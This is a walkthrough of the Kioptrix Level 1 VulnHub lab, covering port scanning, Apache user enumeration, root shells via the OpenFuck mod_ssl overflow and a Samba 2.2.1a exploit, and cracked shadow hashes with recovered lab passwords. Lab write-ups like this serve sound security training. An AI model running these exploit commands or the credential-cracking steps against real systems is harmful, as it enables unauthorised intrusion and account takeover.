# Kioptrix 1

https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

## Discovery

### Port scan

```
nmap -T5 -A -p1-65535 -oG nmap_grepable.txt -oN nmap_normal.txt 192.168.122.238
```

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2018-04-12T03:09:55+00:00; +3h59m59s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)

Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)


Host script results:
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## Services

### OpenSSH 2.9p2

### Apache 1.3.20

Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.
exploits/linux/remote/132.c

It is possible to enumerate users due to the difference in response
codes from a head request to `/~username`. A valid user will return a
403, an invalid user will return a 404.


```
curl -v -X HEAD http://192.168.122.238/~root
curl -v -X HEAD http://192.168.122.238/~asdfasdf
```

#### mod_ssl/2.8.4

This is vulnerable to `exploits/unix/remote/764.c` - 'OpenFuckV2.c'
Remote Buffer Overflow

See this page for updating OpenFuck Exploit ~
http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/

After using the above fix and I could run this command to get a root shell.

`gcc -o openfuck 764.c -lcrypto ; ./openfuck 0x6b 192.168.122.238 443 -c 40`

### Sambda 2.2.1a

Recent versions of smbclient don't report the version string for SMB
connections. Instead I had to use ngrep to find the server
identification from the SMB network traffic.

`sudo ngrep SMB`

That revealed the version to be 2.2.1a. I was then able to find an
exploit for that version of Samba and exploit it to get root.

`gcc -o e 10.c && ./e -b 0 192.168.122.238`

# Post Exploitation

## World writable file

Basically, all of them. There are 2491 world writable file.
See `world_writable_files` for the full list.

## Crack /etc/shadow

There are three hashes of interest:
```
root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
```

### User: Harold

Password: 'WebMaster'
Has no mail.
Is not a sudoer.

### User: John
Password: 'TwoCows2'
Has no mail
has no interesting bash history

### User: root
Password: ????
Intresting mail:

```
From root  Sat Sep 26 11:42:10 2009
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...
```

Has an anaconda
rootpw --iscrypted $1$�.U�5��A$70lHKl6Bm7ZMEaEDikMjD.
